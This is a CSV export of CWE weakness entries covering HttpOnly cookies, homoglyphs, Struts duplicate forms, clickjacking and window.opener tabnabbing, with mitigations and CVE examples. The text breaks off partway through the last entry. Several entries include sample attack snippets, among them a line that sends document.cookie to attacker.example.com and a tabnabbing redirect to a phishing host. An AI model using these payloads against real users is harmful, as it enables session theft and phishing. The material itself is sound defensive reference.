"cwe_id","name","description","extended_description","abstraction","status","category","relationships","consequences","mitigations","detection_methods","examples","likelihood","data"
"CWE-1004","Sensitive Cookie Without 'HttpOnly' Flag","The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.","The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}, {""note"": ""If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user."", ""scope"": ""Integrity"", ""impact"": ""Gain Privileges or Assume Identity""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Leverage the HttpOnly flag when setting a sensitive cookie in a response."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""cve_id"": ""CVE-2022-24045"", ""reference"": ""CVE-2022-24045"", ""description"": ""Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.""}, {""cve_id"": ""CVE-2014-3852"", ""reference"": ""CVE-2014-3852"", ""description"": ""CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.""}, {""cve_id"": ""CVE-2015-4138"", ""reference"": ""CVE-2015-4138"", ""description"": ""Appliance for managing encrypted communications does not use HttpOnly flag.""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""String sessionID = generateSessionId();Cookie c = new Cookie(\""session_id\"", sessionID);response.addCookie(c);"", ""language"": ""Bad""}, {""code"": ""document.write('<img src=\""http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '\"">'"", ""language"": ""Attack""}, {""code"": ""String sessionID = generateSessionId();Cookie c = new Cookie(\""session_id\"", sessionID);c.setHttpOnly(true);response.addCookie(c);"", ""language"": ""Good""}]}]","Medium","{""name"": ""Sensitive Cookie Without 'HttpOnly' Flag"", ""cwe_id"": ""CWE-1004"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2022-24045"", ""reference"": ""CVE-2022-24045"", ""description"": ""Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.""}, {""cve_id"": ""CVE-2014-3852"", ""reference"": ""CVE-2014-3852"", ""description"": ""CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.""}, {""cve_id"": ""CVE-2015-4138"", ""reference"": ""CVE-2015-4138"", ""description"": ""Appliance for managing encrypted communications does not use HttpOnly flag.""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""String sessionID = generateSessionId();Cookie c = new Cookie(\""session_id\"", sessionID);response.addCookie(c);"", ""language"": ""Bad""}, {""code"": ""document.write('<img src=\""http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '\"">'"", ""language"": ""Attack""}, {""code"": ""String sessionID = generateSessionId();Cookie c = new Cookie(\""session_id\"", sessionID);c.setHttpOnly(true);response.addCookie(c);"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": ""Medium"", ""abstraction"": ""Variant"", ""description"": ""The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Leverage the HttpOnly flag when setting a sensitive cookie in a response."", ""effectiveness"": null}], ""consequences"": [{""note"": ""If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}, {""note"": ""If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user."", ""scope"": ""Integrity"", ""impact"": ""Gain Privileges or Assume Identity""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Leverage the HttpOnly flag when setting a sensitive cookie in a response."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.""}"
"CWE-1007","Insufficient Visual Distinction of Homoglyphs Presented to User","The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.","Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase ""l"" (ell) and uppercase ""I"" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter ""A"" and the Greek capital letter ""Α"" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark ""À"" and its equivalent ""Á"" with the acute accent.
            Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions."", ""scope"": ""Integrity, Confidentiality"", ""impact"": ""Other""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.\n                  Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.\n                  Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms."", ""effectiveness"": null}]","[{""cve_id"": ""CVE-2013-7236"", ""reference"": ""CVE-2013-7236"", ""description"": ""web forum allows impersonation of users with homoglyphs in account names""}, {""cve_id"": ""CVE-2012-0584"", ""reference"": ""CVE-2012-0584"", ""description"": ""Improper character restriction in URLs in web browser""}, {""cve_id"": ""CVE-2009-0652"", ""reference"": ""CVE-2009-0652"", ""description"": ""Incomplete denylist does not include homoglyphs of \""/\"" and \""?\"" characters in URLs""}, {""cve_id"": ""CVE-2017-5015"", ""reference"": ""CVE-2017-5015"", ""description"": ""web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs""}, {""cve_id"": ""CVE-2005-0233"", ""reference"": ""CVE-2005-0233"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""cve_id"": ""CVE-2005-0234"", ""reference"": ""CVE-2005-0234"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""cve_id"": ""CVE-2005-0235"", ""reference"": ""CVE-2005-0235"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""http://www.еxаmрlе.соm"", ""language"": ""Attack""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""123.123.123.123 аdmіn [17/Jul/2017:09:05:49 -0400] \""GET /example/users/userlist HTTP/1.1\"" 401 12846\n\t\t  123.123.123.123 аdmіn [17/Jul/2017:09:06:51 -0400] \""GET /example/users/userlist HTTP/1.1\"" 200 4523\n\t\t  123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] \""GET /example/users/editusers HTTP/1.1\"" 200 6291\n\t\t  123.123.123.123 аdmіn [17/Jul/2017:09:10:02 -0400] \""GET /example/users/editusers HTTP/1.1\"" 200 6291"", ""language"": ""Result""}]}]","Medium","{""name"": ""Insufficient Visual Distinction of Homoglyphs Presented to User"", ""cwe_id"": ""CWE-1007"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2013-7236"", ""reference"": ""CVE-2013-7236"", ""description"": ""web forum allows impersonation of users with homoglyphs in account names""}, {""cve_id"": ""CVE-2012-0584"", ""reference"": ""CVE-2012-0584"", ""description"": ""Improper character restriction in URLs in web browser""}, {""cve_id"": ""CVE-2009-0652"", ""reference"": ""CVE-2009-0652"", ""description"": ""Incomplete denylist does not include homoglyphs of \""/\"" and \""?\"" characters in URLs""}, {""cve_id"": ""CVE-2017-5015"", ""reference"": ""CVE-2017-5015"", ""description"": ""web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs""}, {""cve_id"": ""CVE-2005-0233"", ""reference"": ""CVE-2005-0233"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""cve_id"": ""CVE-2005-0234"", ""reference"": ""CVE-2005-0234"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""cve_id"": ""CVE-2005-0235"", ""reference"": ""CVE-2005-0235"", ""description"": ""homoglyph spoofing using punycode in URLs and certificates""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""http://www.еxаmрlе.соm"", ""language"": ""Attack""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""123.123.123.123 аdmіn [17/Jul/2017:09:05:49 -0400] \""GET /example/users/userlist HTTP/1.1\"" 401 12846\n\t\t  123.123.123.123 аdmіn [17/Jul/2017:09:06:51 -0400] \""GET /example/users/userlist HTTP/1.1\"" 200 4523\n\t\t  123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] \""GET /example/users/editusers HTTP/1.1\"" 200 6291\n\t\t  123.123.123.123 аdmіn [17/Jul/2017:09:10:02 -0400] \""GET /example/users/editusers HTTP/1.1\"" 200 6291"", ""language"": ""Result""}]}], ""categories"": [], ""likelihood"": ""Medium"", ""abstraction"": ""Base"", ""description"": ""The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.\n                  Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.\n                  Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder."", ""effectiveness"": null}], ""consequences"": [{""note"": ""An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions."", ""scope"": ""Integrity, Confidentiality"", ""impact"": ""Other""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [""CAPEC-632""], ""mitigations_text"": ""Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.\n                  Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.; Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.\n                  Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder."", ""detection_methods"": [{""method"": null, ""description"": ""If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms."", ""effectiveness"": null}], ""extended_description"": ""Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase \""l\"" (ell) and uppercase \""I\"" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter \""A\"" and the Greek capital letter \""Α\"" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark \""À\"" and its equivalent \""Á\"" with the acute accent.\n            Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.""}"
"CWE-102","Struts: Duplicate Validation Forms","The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.","If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<form-validation>\n\t\t\t\t   <formset>\n\t\t\t\t\t <form name=\""ProjectForm\""> ... </form>\n\t\t\t\t\t   <form name=\""ProjectForm\""> ... </form>\n\t\t\t\t\t </formset>\n\t\t\t\t   </form-validation>"", ""language"": ""Bad""}]}]","","{""name"": ""Struts: Duplicate Validation Forms"", ""cwe_id"": ""CWE-102"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<form-validation>\n\t\t\t\t   <formset>\n\t\t\t\t\t <form name=\""ProjectForm\""> ... </form>\n\t\t\t\t\t   <form name=\""ProjectForm\""> ... </form>\n\t\t\t\t\t </formset>\n\t\t\t\t   </form-validation>"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files."", ""detection_methods"": [], ""extended_description"": ""If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.""}"
"CWE-1021","Improper Restriction of Rendered UI Layers or Frames","The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.","A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings."", ""scope"": ""Access Control"", ""impact"": ""Gain Privileges or Assume Identity, Bypass Protection Mechanism, Read Application Data, Modify Application Data""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.\n                  The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""A developer can use a \""frame-breaker\"" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.\n                  It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The \""frame-breaking\"" script does not intuitively account for multiple nested frames that can be presented to the user."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the \""frame-ancestors\"" directive or the \""frame-src\"" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""cve_id"": ""CVE-2017-7440"", ""reference"": ""CVE-2017-7440"", ""description"": ""E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message""}, {""cve_id"": ""CVE-2017-5697"", ""reference"": ""CVE-2017-5697"", ""description"": ""Hardware/firmware product has insufficient clickjacking protection in its web user interface""}, {""cve_id"": ""CVE-2017-4015"", ""reference"": ""CVE-2017-4015"", ""description"": ""Clickjacking in data-loss prevention product via HTTP response header.""}, {""cve_id"": ""CVE-2016-2496"", ""reference"": ""CVE-2016-2496"", ""description"": ""Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.""}, {""cve_id"": ""CVE-2015-1241"", ""reference"": ""CVE-2015-1241"", ""description"": ""Tapjacking in web browser related to page navigation and touch/gesture events.""}, {""cve_id"": ""CVE-2017-0492"", ""reference"": ""CVE-2017-0492"", ""description"": ""System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.""}]","","{""name"": ""Improper Restriction of Rendered UI Layers or Frames"", ""cwe_id"": ""CWE-1021"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2017-7440"", ""reference"": ""CVE-2017-7440"", ""description"": ""E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message""}, {""cve_id"": ""CVE-2017-5697"", ""reference"": ""CVE-2017-5697"", ""description"": ""Hardware/firmware product has insufficient clickjacking protection in its web user interface""}, {""cve_id"": ""CVE-2017-4015"", ""reference"": ""CVE-2017-4015"", ""description"": ""Clickjacking in data-loss prevention product via HTTP response header.""}, {""cve_id"": ""CVE-2016-2496"", ""reference"": ""CVE-2016-2496"", ""description"": ""Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.""}, {""cve_id"": ""CVE-2015-1241"", ""reference"": ""CVE-2015-1241"", ""description"": ""Tapjacking in web browser related to page navigation and touch/gesture events.""}, {""cve_id"": ""CVE-2017-0492"", ""reference"": ""CVE-2017-0492"", ""description"": ""System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.""}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.\n                  The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""A developer can use a \""frame-breaker\"" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.\n                  It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The \""frame-breaking\"" script does not intuitively account for multiple nested frames that can be presented to the user."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the \""frame-ancestors\"" directive or the \""frame-src\"" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."", ""effectiveness"": null}], ""consequences"": [{""note"": ""An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings."", ""scope"": ""Access Control"", ""impact"": ""Gain Privileges or Assume Identity, Bypass Protection Mechanism, Read Application Data, Modify Application Data""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [""CAPEC-103"", ""CAPEC-181"", ""CAPEC-222"", ""CAPEC-504"", ""CAPEC-506"", ""CAPEC-587"", ""CAPEC-654""], ""mitigations_text"": ""The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.\n                  The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.; A developer can use a \""frame-breaker\"" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.\n                  It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The \""frame-breaking\"" script does not intuitively account for multiple nested frames that can be presented to the user.; This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the \""frame-ancestors\"" directive or the \""frame-src\"" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.""}"
"CWE-1022","Use of Web Link to Untrusted Target with window.opener Access","The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property.","When a user clicks a link to an external site (""target""), the target=""_blank"" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link.  If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin.  An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""The user may be redirected to an untrusted page that contains undesired content or malicious script code."", ""scope"": ""Confidentiality"", ""impact"": ""Alter Execution Logic""}]","[{""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Specify in the design that any linked external document must not be granted access to the location object of the calling page."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""When creating a link to an external document using the <a> tag with a defined target, for example \""_blank\"" or a named frame, provide the rel attribute with a value \""noopener noreferrer\"".\n                  If opening the external document in a new window via javascript, then reset the opener by setting it equal to null."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Do not use \""_blank\"" targets. However, this can affect the usability of the application."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""cve_id"": ""CVE-2022-4927"", ""reference"": ""CVE-2022-4927"", ""description"": ""Library software does not use rel: \""noopener noreferrer\"" setting, allowing tabnabbing attacks to redirect to a malicious page""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<a href=\""http://attacker-site.example.com/useful-page.html\"" target=\""_blank\"">"", ""language"": ""Bad""}, {""code"": ""window.opener.location = 'http://phishing.example.org/popular-bank-page';"", ""language"": ""Attack""}, {""code"": ""<a href=\""http://attacker-site.example.com/useful-page.html\"" target=\""_blank\"" rel=\""noopener noreferrer\"">"", ""language"": ""Good""}, {""code"": ""var newWindow = window.open(\""http://attacker-site.example.com/useful-page.html\"", \""_blank\"");"", ""language"": ""Bad""}, {""code"": ""var newWindow = window.open(\""http://attacker-site.example.com/useful-page.html\"", \""_blank\"");newWindow.opener = null;"", ""language"": ""Good""}]}]","Medium","{""name"": ""Use of Web Link to Untrusted Target with window.opener Access"", ""cwe_id"": ""CWE-1022"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2022-4927"", ""reference"": ""CVE-2022-4927"", ""description"": ""Library software does not use rel: \""noopener noreferrer\"" setting, allowing tabnabbing attacks to redirect to a malicious page""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<a href=\""http://attacker-site.example.com/useful-page.html\"" target=\""_blank\"">"", ""language"": ""Bad""}, {""code"": ""window.opener.location = 'http://phishing.example.org/popular-bank-page';"", ""language"": ""Attack""}, {""code"": ""<a href=\""http://attacker-site.example.com/useful-page.html\"" target=\""_blank\"" rel=\""noopener noreferrer\"">"", ""language"": ""Good""}, {""code"": ""var newWindow = window.open(\""http://attacker-site.example.com/useful-page.html\"", \""_blank\"");"", ""language"": 